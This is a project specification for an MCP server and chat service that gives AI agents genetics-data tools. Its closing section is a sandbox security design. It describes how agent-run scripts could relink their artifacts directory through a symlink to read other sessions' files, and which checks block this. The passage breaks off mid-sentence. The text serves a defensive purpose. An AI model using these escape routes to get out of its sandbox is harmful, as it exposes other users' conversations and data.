# genetics-mcp-server - Project specification

## Introduction

genetics-mcp-server is a Model Context Protocol (MCP) server and LLM chat service that provides AI assistants and agents with tools to access human genetics data. The server also acts as a bridge between LLMs and a genetics results REST API, translating tool calls into API requests and formatting responses for AI consumption. External MCP servers such as those from gnomAD or Open Targets can also be added in the set of tools available.

## Purpose and Goals

- Provide an MCP server that exposes genetics data tools to AI assistants
- Enable agentic LLM interactions with genetics data through a FastAPI chat service
- Support multiple transport protocols (stdio, SSE, streamable HTTP) for flexible deployment
- Proxy tools from external MCP servers to aggregate genetics data sources
- Maintain clean separation between tool definitions, execution, and LLM integration

## Key Features

- **Standalone MCP Server**: Connects to Claude Desktop, Cursor, or any MCP client via stdio, SSE or streamable HTTP
- **LLM Chat API**: FastAPI service with streaming responses, supporting Anthropic and OpenAI providers
- **Genetics data tools**: Comprehensive access to GWAS, QTL, colocalization, expression, Mendelian disease data, LD, protein annotation, regulatory/functional genomics (open-chromatin atlases, allele-specific methylation, predicted variant effects, MPRA reporter activity), visualizations, and BigQuery for advanced queries
- **Literature and web search**: Integration with Europe PMC, Perplexity, Tavily, and DuckDuckGo
- **External MCP server proxying**: Aggregate tools from remote MCP servers (e.g., gnomAD, Open Targets Platform)
- **Optional IAP/oauth2-proxy authentication**: Protect the chat API via `X-Goog-Authenticated-User-Email` header
- **Per-user API tokens**: Users can create personal bearer tokens for MCP server access, with create/list/revoke management via the chat API
- **Per-user rate limiting**: Sliding window rate limit on chat requests, keyed by user email
- **Per-message size limits**: `_validate_latest_message` (in `chat_api.py`) caps the newest user message's typed-text length (`MAX_MESSAGE_CHARS`, default 50K) and attachment count (`MAX_ATTACHMENTS_PER_MESSAGE`, default 10), rejecting with HTTP 413 before any model call. `_validate_request_size` bounds the request as a whole — total text across **all** messages (`MAX_REQUEST_CHARS`, default 2M, images excluded) and message count (`MAX_MESSAGES_PER_REQUEST`, default 500) — because the per-message check only ever inspects the newest *user* message, leaving a client-sent assistant turn and every replayed history turn unbounded (`genetics-results-suite-e0u`). Applying the per-message cap to every message would have been the tighter rule and the wrong one: replayed tool results are routinely larger than any typed message, so it would reject ordinary long conversations. Attachments are excluded from the text cap: images arrive as `image` blocks and data files (TSV/CSV/Excel) are inlined by the frontend as text blocks prefixed `[File: <name>]` — both are counted toward the attachment limit, not the character limit. The frontend (`LLMChat.tsx`) mirrors these limits for immediate feedback. Bulk data should be attached as a file rather than pasted
- **File attachments**: Upload/download/delete endpoints in `routers/chat_history.py` store files on disk (`ATTACHMENT_STORAGE_PATH`) with metadata in the `chat_attachments` table. Files are classified as `image`, `tsv`, or `excel`. Excel is a binary format, so `.xlsx`/`.xls` uploads are parsed to TSV at upload time via `excel_to_tsv()` (polars `read_excel`, calamine/`fastexcel` engine; all sheets, each prefixed `# Sheet: <name>` when multiple) and the parsed text is stored as a `.tsv` sidecar (`text_path` column); a file that fails to parse is rejected with HTTP 400 and nothing is written. The download endpoint serves the original bytes by default, or the model-ready text via `?as=text` (parsed TSV for excel, original for tsv/csv). The live frontend send path does not round-trip through these endpoints — it parses Excel→TSV client-side with SheetJS (`excelToTsv.ts`) before inlining, since sessions are created lazily after the first exchange and no `session_id` exists at first send. The server-side parse is therefore defense-in-depth: it covers direct API consumers and guarantees stored bytes are never surfaced as binary; `?as=text` is available for any client that prefers a backend round-trip
- **Cost logging**: Estimated USD cost logged for every Anthropic API call based on token usage and model pricing
- **Context usage tracking**: `get_context_window()` in `cost.py` maps model name prefixes to context window sizes (tokens). During streaming, `usage` SSE events are emitted after each agentic loop iteration, enabling the frontend to display a live context usage progress bar
- **Chat history persistence**: SQLite-based storage of conversation threads. Assistant turns persist both their content blocks (`content_json`: text + `tool_use`) and the tool outputs (`tool_results_json`: the `tool_result` blocks). Persisting tool results means a **resumed** conversation replays the actual data the model saw, not just its prose summary — preventing factual drift across turns/sessions (see "Tool result persistence" under Architecture decisions)
- **Configurable prompts**: Per-user LLM configuration stored in database
- **Instructions**: Users store named sets of their own instructions and select one per chat; the chat request carries only the set id and the server appends the stored text to the system prompt as a second cached block (see "Instructions" below)

## Technical implementation considerations

- polars should be used to process tabular data from the genetics API
- matplotlib is used for generating scientific visualizations (PheWAS plots, etc.)
- Asynchronous code execution using async/await with httpx for HTTP calls
- The MCP server uses FastMCP from the mcp library for tool registration
- Tool definitions are shared between MCP server and LLM service via a common module
- Error responses from tools should include `success: false` and an `error` field
- Large tool results are truncated to prevent context overflow in LLM conversations
- External tool errors should not cause problems for the server or clients; log and return error response

## Available tools

### Search tools

| Tool | Description |
|------|-------------|
| `search_phenotypes` | Look up phenotype codes by disease/trait name |
| `search_genes` | Look up gene symbols and genomic positions |
| `lookup_variants_by_rsid` | Convert rsIDs to variant IDs (chr:pos:ref:alt format) |
| `lookup_phenotype_names` | Batch translate phenotype codes to human-readable names |
| `get_gene_group_members` | Enumerate member genes of an HGNC gene group / family by `group_id` or `group_name`, returning symbols + genomic coordinates. Olfactory receptors are **excluded by default** (`exclude_olfactory=true`) since they are GPCRs that dominate large families by count; pass `exclude_olfactory=false` for full membership. Calls the API (`GET /api/v1/gene_group/members`), not BigQuery. For whole-group BigQuery joins (e.g. cis-pQTL colocalizations for all GPCRs), prefer filtering `gene_annotations_v` on `gene_group_ids`/`gene_group_names` directly |
| `normalize_gene_symbols` | Resolve gene symbols / aliases / previous symbols to current approved HGNC symbols (exact, not fuzzy); returns mappings + unresolved inputs. Calls the API (`GET /api/v1/gene/normalize`), not BigQuery |

### Credible set tools (fine-mapped GWAS results)

| Tool | Description |
|------|-------------|
| `get_credible_sets_by_gene` | Get credible sets for variants near a gene (gene body ± `window`, default **500 kb**). The wide default is deliberate: the strongest signal attributed to a gene can sit several hundred kb away (e.g. a long-range regulatory variant), so a narrow window can silently drop the top hit |
| `get_credible_sets_by_variant` | Find associations containing a specific variant |
| `get_credible_sets_by_region` | Get credible sets overlapping a `chr:start-end` region across resources, for loci defined by coordinates rather than a gene or variant. Same `summarize` semantics as the by-variant tool; variant-level rows are capped at 500 inline with `truncated` set |
| `get_credible_sets_by_phenotype` | Get all GWAS associations for a phenotype |
| `get_credible_set_leads_by_phenotype` | One row per credible set: its lead variant (flagged lead, else highest PIP, ties by p-value). The cheap way to enumerate a trait's independent signals without pulling every member variant |
| `get_credible_set_by_id` | Get all variants in a specific credible set |
| `get_credible_sets_by_qtl_gene` | Get QTL associations where a gene is the molecular trait. `summarize` defaults to **true** (credible set-level), like the sibling credible-set tools — see Architecture decision 7. Also the correct tool for **gene-based caQTL** questions: a caQTL trait is a chromatin peak, and the underlying `all_cs_qtl_file` resolves the Open4Gene peak-to-gene link (cell-type-matched), so `trait` holds the linked gene symbol while `trait_original`/`cs_id` keep the peak id. Peak-vs-gene coordinate matching is NOT a substitute — linked peaks sit up to ~1 Mb away and most peaks near a gene are not linked to it |
| `get_credible_sets_stats` | Get summary statistics of credible sets for a dataset |

### Gene data tools

| Tool | Description |
|------|-------------|
| `get_gene_expression` | Get tissue-specific gene expression levels |
| `get_gene_disease_associations` | Get Mendelian disease relationships from ClinGen/GENCC |
| `get_exome_results_by_gene` | Get rare variant burden test results (genebass filtered to p < 1e-4, IBD exome-wide significant only) |
| `get_exome_results_by_variant` | Exome results for one specific variant across exome resources — the rare-variant counterpart to `get_credible_sets_by_variant` |
| `get_exome_results_by_region` | Exome results overlapping a `chr:start-end` region; rows capped at 500 inline with `truncated` set |
| `get_exome_results_by_phenotype` | Get exome variant results for a specific phenotype across all genes (genebass and IBD) |
| `get_gene_based_results` | Get gene-level burden test results from genebass, IBD, BipEx2, and SCHEMA (genebass rows filtered to p < 1e-4) |
| `get_gene_based_results_by_phenotype` | Get the complete unfiltered gene burden results for one phenotype — every gene and annotation class, no p-value cutoff |
| `get_nearest_genes` | Get genes nearest to a variant position |
| `get_genes_in_region` | Get all genes in a genomic region |

### Regulatory and functional genomics tools

Four evidence types that must not be conflated, because a user question about "regulatory effect" maps to a different one depending on wording: a measured accessibility **atlas** (`open_chromatin`), an accessibility **QTL** (caQTL, reached through the credible-set tools above), an **in-silico prediction** (`variant_effect`), and a **measured reporter assay** (`mpra`). Each tool description states which it is. The gene-keyed variants all select by genomic coordinates (gene body ± `window`, default **500 kb**) rather than by `gene_most_severe`, since most-severe-consequence attribution misses exactly the nearby regulatory variants these datasets are about.

| Tool | Description |
|------|-------------|
| `get_asm_qtl_by_variant` | Allele-specific methylation QTL (ASM-QTL) for a variant: associations with CpG/MDS methylation rates, effect sizes, methylation rate on reference vs alternative haplotype, primary/secondary variant rank. `resources`: `decode_cpg`, `decode_mds` |
| `get_asm_qtl_by_gene` | ASM-QTL for variants near a gene (gene body ± `window`) |
| `get_peak_to_genes`, `get_gene_to_peaks` | Open4Gene peak-to-gene **links** with the cell type each link was significant in — which gene a regulatory region acts on, and its inverse. This is what turns a caQTL peak id into candidate target genes; distinct from the open-chromatin atlas tools below, which measure accessibility and carry no link evidence |
| `get_open_chromatin_by_peak` | One atlas peak by its `chr-start-end` id, with every cell_type/tissue/condition row recorded for it |
| `get_open_chromatin_by_variant`, `get_open_chromatin_by_region`, `get_open_chromatin_by_gene` | Measured open-chromatin **atlas** peaks (scATAC/snATAC/bulk-ATAC/chromHMM) overlapping a variant position, a region, or a gene's window, labelled by `cell_type`, `tissue`, `life_stage` and `condition` so cell-type specificity can be reported. `resources`: `marderstein`, `li_brain_atac`, `catlas`, `epimap`, `calderon_immune`, `rosmap_brain` |
| `get_variant_effect_by_variant`, `get_variant_effect_by_gene` | In-silico **predicted** variant effect on chromatin accessibility: ChromBPNet (`model=chrombpnet`) per cell type/tissue with `score`/`mlog10p`/`quantile_rank`/`is_significant`, FLARE (`model=flare`) as a pan-context score with null cell type. `resources`: `marderstein` |
| `get_mpra_by_variant`, `get_mpra_by_region`, `get_mpra_by_gene` | **Measured** cis-regulatory allelic activity from a massively parallel reporter assay (Siraj et al. 2026). One long row per `cell_line` — `meta` (cross-cell-line meta-analysis) or K562/HEPG2/SKNSH/HCT116/A549 — carrying `emVar` (allele modulates reporter expression), `active`, `log2Skew` (signed allelic effect), `log2FC`, and their `*_mlog10p`. Coverage is partial (fine-mapped GTEx/UKBB/BBJ plus control common variants), so absence ≠ no effect. `resources`: `siraj_mpra` |
| `get_mpra_pip_concordance_by_gene` | Joins FinnGen fine-mapped credible sets (`credible_sets_v`, filtered to `resource` + `pip >= min_pip`, default 0.1) to the MPRA cross-cell-line meta row on the shared variant key, for variants near a gene — the regulatory-buffering check of whether credibly causal variants are measurably active. Ordered `emVar` then PIP. Distinct from `get_mpra_by_gene`, which returns MPRA rows without the PIP cross-reference |

### Other genetics tools

| Tool | Description |
|------|-------------|
| `get_colocalization` | Find traits sharing causal signals at a variant |
| `get_colocalization_by_credible_set` | Colocalizations of ONE credible set (resource + phenotype + `cs_id`), so the result is that signal's partners rather than everything at the position. `dual_format` returns both traits' columns |
| `get_resource_metadata` | Harmonized per-trait metadata for a resource (trait names, sample sizes, sub-studies of a collection) — the per-trait rows behind `list_datasets`' aggregates |
| `get_dataset_display_names` | Display-name overrides keyed by the raw `dataset` column value, for rendering results |
| `get_phenotype_report` | Get detailed markdown report for a phenotype. Disabled by default — enable with `ENABLE_PHENOTYPE_REPORT` |
| `list_datasets` | List all datasets with descriptions, provenance, sample-size stats, and supported products |
| `get_summary_stats` | Get summary statistics (p-value, beta, SE, allele frequencies) for specific variant-phenotype pairs |
| `get_summary_stats_by_region` | Every summary stat record in a `chr:start-end` region for one or more phenotypes — the full association profile of a locus, including sub-threshold variants credible sets omit. Phenotypes are REQUIRED (sumstats are stored per phenotype); rows capped at 500 inline |
| `get_hla_by_phenotype` | Every imputed classical HLA allele tested against one or more phenotypes (187 alleles across HLA-A/-B/-C/-DPB1/-DQA1/-DQB1/-DRB1/-DRB3/-DRB4/-DRB5, FinnGen R14) — the interpretable answer whenever a signal lands in the MHC, where SNP sumstats are unreadable because of the LD. Optional `genes` filter. Read `mlog10p`, not `pval` (it underflows to 0 at these effect sizes), and check `info`: a rare allele imputed below 0.5 yields a huge unstable beta that is an artifact |
| `get_hla_by_allele` | The inverse — every phenotype one HLA allele is associated with, across all 2,712 endpoints (a PheWAS of the allele; MHC pleiotropy across autoimmune traits is the norm). Goes through BigQuery `hla_associations_v` because the per-phenotype files results-api serves cannot span traits. Allele names are gene-stripped and two-field (`B*27:05`); a written `HLA-` prefix is stripped for the caller. Filtered to `min_info` 0.5 by default |
| `get_variant_annotations` | Get variant annotations (consequence, allele frequency, rsID, enrichment) by variant, region, gene, or batch variants |
| `get_myvariant_annotations` | Get clinical/functional annotations from myvariant.info (ClinVar, CADD, functional predictions, cancer data). Chat-backend only — excluded from MCP server |

### LD tools (FinnGen LD Server)

| Tool | Description |
|------|-------------|
| `get_ld_between_variants` | Get LD (r2, D') between two specific variants using FinnGen reference panel |
| `get_variants_in_ld` | Get all variants in LD with a query variant within a specified window |

### Visualization tools

| Tool | Description |
|------|-------------|
| `create_phewas_plot` | Create a PheWAS plot showing phenotype associations for a variant (returns base64 PNG) |
| `analyze_variant_list` | Analyze a list of variants for shared phenotype associations, QTL patterns, tissue enrichment, and nearest genes |

### BigQuery tools (fallback for complex queries)

| Tool | Description |
|------|-------------|
| `query_database` | Execute custom SQL against genetics views (fallback for queries specialized tools cannot handle) |
| `get_database_schema` | Get schema for BigQuery views before writing queries. Accepts optional `table` parameter to get just one table's schema. Returns resource metadata with aliases, column descriptions, allowed filter values, and example SQL queries |

BigQuery contains multiple tables beyond just credible sets — including exome/burden test results, colocalization, and more. The `get_database_schema` tool discovers all available tables.

A `gene_annotations` BigQuery table/view (built in `genetics-results-db`) is also exposed via `get_database_schema` and is the `query_database` surface for cis/trans QTL filtering — JOIN its gene coordinates to `colocalization_v` instead of hand-typing coordinate literals — and for any-group gene enumeration. This stands apart from the two specialized gene tools (`get_gene_group_members`, `normalize_gene_symbols`), which call the API and do **not** read this table. **Coordinate windows, not `gene_most_severe`, for "near a gene" queries**: when finding signals (GWAS or QTL) physically near a gene in BigQuery, JOIN `gene_annotations_v` for the gene body and filter on a coordinate window (≈ 500 kb), rather than filtering by `gene_most_severe`. The latter is per-variant most-severe-consequence attribution — unreliable for regulatory variants and prone to both missing nearby signals and mis-attributing distant ones. `get_asm_qtl_by_gene` now selects by this coordinate window, and the system prompt instructs the LLM to do the same for ad-hoc SQL. (`get_credible_sets_by_qtl_gene` is the exception: it finds QTLs where the gene is the *molecular trait*, correctly keyed by gene name.) Single source of truth split: the specialized tools resolve gene groups/symbols via the API; BigQuery's `gene_annotations` stands alone as the surface for SQL JOINs and ad-hoc enumeration. Views include a derived `resource` column that maps dataset names to resource identifiers (e.g., `FinnGen_R13` → `finngen`, `UKB_PPP` → `ukbb`, `Open_Targets_26.06` → `open_targets`). This allows filtering by `WHERE resource = 'finngen'` instead of matching dataset names directly. The schema response includes resource metadata with human-readable labels and aliases to help agents map user intent to correct filter values (e.g., "bipex" → `resource = 'bipex2'`). Collection resources like eQTL Catalogue are collapsed into summaries rather than listing hundreds of individual IDs.

### External search tools

The external search tools split into two conceptually distinct families:

- **Literature backends** (`search_scientific_literature`): query a paper-indexing API — either `europepmc` (covers PubMed, Europe PMC, bioRxiv, medRxiv) or `perplexity` (broader scientific web). Exactly one backend is queried per call; "backend" is the API hit, not the content source indexed.
- **Structured curated databases** (`search_mgi`, `search_cbioportal`): query a curated biological database that returns structured records (genes, phenotypes, alleles, orthologs; somatic alteration frequencies) rather than papers. Complements — does not replace — the literature backends.

**Backend selection is the user's, never the model's.** The tool schema exposes no `backend` parameter, so the model cannot request one; `LLMService._execute_tool` additionally strips any `backend` key the model invents anyway. Selection resolves in this order, first match wins: the request-level `literature_backend` in the chat API body (the web UI always sends it, defaulting to `perplexity`); then `LITERATURE_SEARCH_BACKEND`; then the built-in default `perplexity`. Europe PMC is therefore used only when the user explicitly selects it. Every response still carries a `backend` field naming the API that ran, and that field is what the model must report. (Earlier the model could pass its own `backend`, which the request-level value then silently overrode; the model narrated the backend it had asked for and confabulated hybrid labels around the mismatch. Removing the parameter removes the mismatch at its source.)

**Perplexity result metadata**: the Sonar response gives a `search_results` list (title, date, snippet, url) plus a prose `summary`; it carries no authors or journal. Records that expose a PMID, DOI or PMCID in their URL are therefore hydrated in one batched Europe PMC lookup (`_hydrate_literature_metadata`) filling authors/journal/year/title/abstract, so citations can be rendered as author-year markdown links. Hydration is best-effort — a Europe PMC failure leaves the Perplexity-supplied title/year/snippet intact. Each record reports `source: perplexity` (the API searched) and `metadata_source` (`perplexity` or `europepmc`, where the bibliographic details came from); hydration never changes which backend was searched.

| Tool | Description |
|------|-------------|
| `search_scientific_literature` | Search PubMed/bioRxiv via Europe PMC or Perplexity |
| `web_search` | General web search via Tavily or DuckDuckGo |
| `search_mgi` | Search Jackson Lab Mouse Genome Informatics for curated mouse gene→phenotype annotations, knockout/transgenic allele phenotypes, and human-mouse ortholog mappings. Chat-backend only — excluded from MCP server |
| `search_cbioportal` | Query cBioPortal for somatic alteration frequency in cancer cohorts: pan-cancer mutation/CNA frequency, breakdown by cancer type, hotspot protein changes, fusion partners, study lookup. Chat-backend only — excluded from MCP server |

#### MGI (native tool, chat-backend only)

The `search_mgi` tool queries Jackson Lab's MouseMine (InterMine REST endpoint) for curated mouse data: gene → MP-ontology phenotype terms, knockout/transgenic allele phenotypes, and mouse-human ortholog mappings. Unlike Europe PMC and Perplexity which return papers, MGI returns structured curated records — so it complements rather than substitutes for literature search. Excluded from the MCP server (mirroring `get_myvariant_annotations`); only available via the chat API.

#### cBioPortal (native tool, chat-backend only)

`search_cbioportal` queries the public cBioPortal REST API (`https://www.cbioportal.org/api`, no authentication for public studies) for somatic alteration frequencies across ~540 cancer studies and ~400,000 tumour samples. Six `query_type`s: `gene_summary` (pan-cancer mutation and copy-number frequency), `gene_by_cancer_type`, `gene_mutations` (recurrent protein changes), `gene_fusions`, `variant_hotspot` (recurrence at one residue), `study_search`. Excluded from the MCP server alongside `search_mgi`; chat API only. Data is ODbL-licensed, so every response carries an `attribution` field and `study_search` returns per-study citations and PMIDs.

**GRCh37/GRCh38 is the defining constraint.** 467 of 539 studies are hg19, and cBioPortal reports each record on its source study's build without lifting over — so its genomic coordinates cannot be compared against this suite's GRCh38 positions. Every query type therefore keys on gene symbol and protein change, which are build-independent. `gene_mutations` returns coordinates under a `coordinates_by_build` map that is never merged across builds, and every result carries a `genome_build_note` telling the agent to reach GRCh38 variants via `get_variant_protein_effect` (genomic → protein change) first. This is the same reasoning as the GRCh38 pin on `get_variant_protein_effect`: a coordinate carries no build, so silently mixing them answers for the wrong genome.

**Denominators are the other correctness trap.** Counting altered samples is easy; dividing by the right cohort is not. Three distinct denominators exist and were checked against cBioPortal's own published figures:

- `gene_summary` uses `/mutation-data-counts/fetch`, which is gene-panel aware — its `MUTATED + NOT_MUTATED` reproduces the authoritative `numberOfProfiledCases` exactly (EGFR: 17,483/366,522), and it also reports `not_profiled_samples`.
- `gene_by_cancer_type` uses `/clinical-data-counts/fetch` with `genomicProfiles: [["mutations"]]`. That restriction is load-bearing: without it the denominator counts every sample in the study including unsequenced ones (400,081 rather than 367,336) and every frequency comes out low. It is profile-level rather than panel-level, so its frequencies are lower bounds — stated in the `denominator_basis` field on each response.
- Cancer type comes from each sample's `CANCER_TYPE` clinical attribute, not its study's headline cancer type, because the large pan-cancer cohorts (MSK-IMPACT alone is ~10k samples) carry `cancerTypeId: mixed` and would otherwise vanish from every per-cancer-type row. Studies spell the same disease differently, so labels are folded on a punctuation- and case-insensitive key before counting.

**Response-size guard.** `/mutations/fetch` returns one record per mutated sample, so pan-cancer TP53 is ~142k records / ~100 MB. `gene_mutations` therefore pre-flights with `projection=META` (a `total-count` header, no body, ~0.4 s) and falls back to the TCGA PanCancer Atlas + MSK pan-cancer cohorts above `_CBIO_MAX_MUTATION_RECORDS` (25,000), which keeps TP53 at ~23k records. The result reports `scope`, `scope_note`, `total_mutation_records` and `records_analyzed` so a narrowed count is never mistaken for a pan-cancer one.

Study, molecular-profile and cancer-type-denominator lookups are cached on the executor for the process lifetime — they do not depend on the gene queried and change only when cBioPortal reimports data.

### External MCP server tools (proxied)

#### gnomAD MCP

Provides variant annotations, population frequencies, gene constraint/expression data, and pathogenicity interpretation from gnomAD. Server name: `gmd-agent`. Tools are registered without prefix. Five All of Us (AoU) tools are excluded via `EXTERNAL_MCP_EXCLUDE_TOOLS`.

Available tools (after exclusions):

| Tool | Description |
|------|-------------|
| `get_variant_details` | Variant details/summary |
| `get_variant_frequencies` | Population allele frequencies |
| `get_variant_summary` | Variant summary |
| `get_multiple_variant_details` | Batch variant details |
| `interpret_variant_pathogenicity` | Interpret variant pathogenicity |
| `analyze_variant_cooccurrence` | Phase relationship (cis vs trans) between variants |
| `analyze_variant_pext` | Proportion expressed across transcripts (pext) score |
| `get_gene_summary` | Gene summary including constraint scores |
| `get_gene_expression_summary` | Gene expression summary |
| `get_gene_variants` | Variants for a gene |
| `get_mendelian_gene_summary` | Mendelian disease gene summary |
| `get_region_variants` | Variants in a genomic region |
| `get_transcript_details` | Transcript details |
| `list_gene_transcripts` | List transcripts for a gene |
| `get_agent_info` | Agent information |

#### myvariant.info (native tool, chat-backend only)

The `get_myvariant_annotations` tool queries myvariant.info for clinical and functional variant annotations not available from gnomAD MCP or the local API. Provides ClinVar clinical significance, CADD deleteriousness scores, functional predictions (SIFT, PolyPhen2, MutationTaster), cancer annotations (COSMIC, CIViC), and dbSNP rsIDs. Excluded from the MCP server — only available via the chat API. gnomAD population frequency fields are excluded by default to avoid overlap with gnomAD MCP.

#### UniProt (native tools, chat-backend only)

Four tools give the agent direct protein-level annotation, replacing the `web_search(include_domains=['rest.uniprot.org'])` fallback that returned UniProt's JavaScript placeholder page and the parametric-memory recall that produced wrong accessions.

| Tool | Description |
|------|-------------|
| `get_protein_annotations` | Full UniProtKB entry for a protein resolved from a gene symbol or accession: metadata, residue-level features (domains, active/binding/metal sites, signal peptides, PTMs, and curated natural variants via `feature_types=['variant']`), sequence, isoforms, and cross-references. `include` selects result sections, `feature_types` filters features, `residue_range` restricts them to a region. Chat-backend only — excluded from MCP server |
| `map_protein_variants` | Map protein-level variant notation (e.g. `['P70A', 'G393A', 'R438H', 'W873C']` with `query='TPO'`) to genomic coordinates and rsIDs via the EBI Proteins API coordinate mapping. Attaches any curated UniProt natural variant (disease, dbSNP) sitting at the mapped residue. Chat-backend only — excluded from MCP server |
| `get_variant_protein_effect` | The genomic→protein direction: genomic coding SNVs (`chr:pos:ref:alt`, GRCh38) → amino-acid change plus curated UniProt/ClinVar annotation (consequence, disease, clinical significance, population frequency, dbSNP/ClinVar xrefs), via the EBI Proteins `variation/hgvs` endpoint. SNVs only; indels and non-coding SNVs return an explicit note, not a silent empty. Reviewed (Swiss-Prot) entries and isoforms only. Chat-backend only — excluded from MCP server |
| `search_uniprot` | Search UniProtKB by free text, keyword, or organism when the target protein is not yet known; `reviewed_only`, `fields`, `size`, and `count_only` control the result set. Chat-backend only — excluded from MCP server |

**Client layer** (`tools/uniprot.py`): `UniProtClient` wraps both `https://rest.uniprot.org` (entries, search, sequences) and `https://www.ebi.ac.uk/proteins/api` (protein↔genome coordinate mapping, genomic-HGVS variant effect) over the shared `httpx.AsyncClient`. It owns:

- **Identifier resolution** — a gene symbol is matched through three tiers (exact gene name → any gene name/synonym → free text); an accession-shaped input that does not resolve is retried as a symbol, because `P2RY12`, `B4GAT1`, `B3GNT2` and the `H2AC*`/`H2BC*` histone families are simultaneously valid accession patterns and gene symbols. Merged (secondary) and withdrawn accessions are reported as `stale_accession` / `inactive` rather than silently followed.
- **A resolution block on every result** — `accession`, `entry_name`, `protein_name`, `gene_names`, `organism`, `taxon_id`, `reviewed`, `match_basis`, `ambiguous`, `alternatives`. This makes a mis-resolved protein visible in the same result (an accession supplied for the wrong protein comes back with the gene names it actually names), and the system prompt requires the agent to check it before quoting any annotation.
- **A process-wide TTL cache** (`UNIPROT_CACHE_TTL`, default 24 h, monotonic-clock deadlines, LRU-bounded). UniProt releases at most weekly, so a long TTL is safe; setting the TTL to `0` disables caching.
- **Genomic-HGVS variant effect** — `get_variant_protein_effect` converts each `chr:pos:ref:alt` into a GRCh38 RefSeq genomic HGVS (`NC_0000NN.V:g.<pos><ref>><alt>`, from a pinned per-chromosome accession table) and looks it up through the EBI `variation/hgvs` endpoint. The assembly is pinned to GRCh38 — a variant id carries no build, and guessing one would silently answer for the wrong genome. Reviewed entries are distinguished from the TrEMBL predicted entries the endpoint also returns by their Swiss-Prot mnemonic `entryName` and non-`Predicted` protein existence.

**Exposure decision**: like `get_myvariant_annotations` and `search_mgi`, these are chat-backend only — their names are in the `_mcp_disabled` set in `mcp_server.py`, so they are never registered on the standalone MCP server. Category is `general`, so they survive the `api`/`bigquery`/`rag` profile split (protein annotation is orthogonal to all three), and `get_protein_annotations`, `map_protein_variants` and `search_uniprot` are in the `literature_review` skill's `extra_tools` so subagents doing gene/protein biology can reach them (`get_variant_protein_effect` is not — it answers a genomic-coordinate question rather than a literature one).

### Code execution tools

Tool halves of the sandbox design (`genetics-results-suite-4h6`). The sandbox itself is
not deployed, so `run_analysis` does not exist yet and `read_artifact` has nothing to read
in any running service.

| Tool | Description |
|------|-------------|
| `list_capabilities` | SDK catalogue, one module at a time (`genetics`, `client`, `errors`); omit the argument for an index of module names and their exports. Signatures and docstrings are rendered from the live SDK objects with `inspect`, not from a checked-in copy, so a new dataset function appears without a doc edit and cannot drift. This is what makes the catalogue cost zero per-turn context: the model carries one tool description instead of a signature per data product |
| `read_artifact` | Read one named file an analysis script wrote to its artifacts directory. Takes a bare artifact **name** — never a path, never an execution id. Text is returned inline (100k chars, `truncated` flag), binary base64-encoded with its content type; over 4 MiB is refused rather than cut, because a truncated PNG is garbage rather than a short answer. Chat-backend only — excluded from MCP server |

**Both are category `orchestration`**, not `general`: they hand work to another runtime
rather than fetching data, which is what `launch_subagents` is. The category by itself
excludes nothing — `TOOL_PROFILES` includes `orchestration` in both the `api` and
`bigquery` profiles, so it reaches three of the five subagent skills — so `subagent.py`
names all three orchestration tools explicitly:
`disabled |= {"launch_subagents", "read_artifact", "list_capabilities"}`. That name list,
not the category, is what keeps a subagent from retrieving another execution's artifacts
or being told how to start one; `tests/test_subagent.py` pins it.

**Exposure decision**: `read_artifact` is in the `_mcp_disabled` literal in
`mcp_server.py`. This is a security control, not a product decision — the user requires
that code execution is not reachable via MCP — and it is the *only* registration-layer
control, since `register_mcp_tools` is called with no profile and `tool_profile=None`
means no filtering at all. `run_analysis` joins the set with `4h6.16`.
`list_capabilities` is deliberately **not** excluded: what it renders is per-function SDK
signatures and docstrings, which describe the SDK's shape rather than data, session state
or any execution, and an exclusion set padded with harmless names stops reading as a
security control. That surface is genuinely new disclosure to an MCP client — the SDK is
not the MCP tool surface — and is judged acceptable on its content, not on being visible
elsewhere. **Module-level** docstrings are stripped from the output for exactly that
reason: `sdk.__doc__` names the endpoint and credential env vars (`GENETICS_API_URL`,
`BIGQUERY_API_URL`, `INTERNAL_API_SECRET`) and the services behind them, none of which is
needed to write a call. The index's one-line module summaries are written in `executor.py`
(`_SDK_MODULE_SUMMARIES`) rather than sliced out of `__doc__`. What that does **not**
remove, and the justification must not pretend otherwise: function docstrings describe
the SDK, so they disclose SDK internals by **category**. The categories are the claim;
the examples are illustrative, not an enumeration (enumerating them precisely has been
attempted twice and been incomplete both times):

- the **settings mechanism** — that endpoint URLs come from the environment and cannot be
  set from a script (`_URL_SETTINGS`, `configure`);
- **internal service and component names** — `db-api`, the FinnGen LD server, the sandbox;
- the **execution model** behind an argument — e.g. that `limit=` still runs the full join
  and `ORDER BY` server-side;
- **limit and quota values** — the per-execution row cap, the per-query and per-execution
  byte quotas, and the SDK's own row ceilings.

Rewriting them is a separate decision (it would also drift the generated
`sandbox/stubs/*.pyi`). `genetics_results.<view>` names are deliberately absent from that
list: they already appear in MCP tool descriptions, so they are not new disclosure.

**Where the artifact read happens**: `read_artifact` reads the single directory named by
`SANDBOX_ARTIFACTS_DIR`, and returns "code execution is not enabled" when it is unset —
which is everywhere today. Chat-backend never sets it; retrieval there proxies over HTTP
to the sandbox pod, where the filesystem read happens (`4h6.11` owns that client and the
session-scoped name resolution). The allow-list is its own variable on purpose: the
obvious alternative, `SUBAGENT_ALLOWED_PATHS`, is `/data` in the deployment — the PVC
holding `chat_history.db` and `llm_config.db` — so wiring artifact reads to it would hand
the model every conversation in the deployment.

Two structural checks fail closed to "not enabled" before any name is looked at, both in
`_artifacts_dir()`. Both are **advisory**: they answer about a path string, and the answer
is stale the moment it returns (see the descriptor check below).

- **the configured directory may not itself be a symlink** (`lstat` + `S_ISLNK`).
  `_validate_path` resolves both sides, so a symlinked allow-list root makes every file
  under its target validate. The child uid owns `/scratch/<id>`, so it can `rmdir` its
  `artifacts` and relink it at another execution's retained artifacts — the cross-session
  channel the suite's `docs/code-execution-security.md` section 6.4 exists to prevent.
- **the resolved directory must sit under the hardcoded `_ARTIFACTS_DIR_PREFIX`
  (`/scratch/`)**. `read_artifact` is registered in the chat backend, so without this the
  only thing preventing `SANDBOX_ARTIFACTS_DIR=/data` from base64'ing `chat_history.db`
  back to the model is that nobody sets it. chat-backend has no `/scratch` volume, so the
  misconfiguration is unreachable rather than merely unmade.

Then, per read: the name check rejects separators, `..`, NUL and absolute paths before
touching the filesystem, and `skills/sandbox_tools.py:_validate_path` re-checks the
*resolved* path. **Neither is the enforcing layer** — a script owns its artifacts directory
and can swap what a name resolves through after the check, at the final component *or at
the `artifacts` directory itself*, and `_validate_path` cannot see the latter because it
resolves both sides through the same swapped link and they agree. So after those checks
nothing is addressed by path again:

- `_open_artifacts_dir()` opens the directory once with `O_RDONLY | O_DIRECTORY |
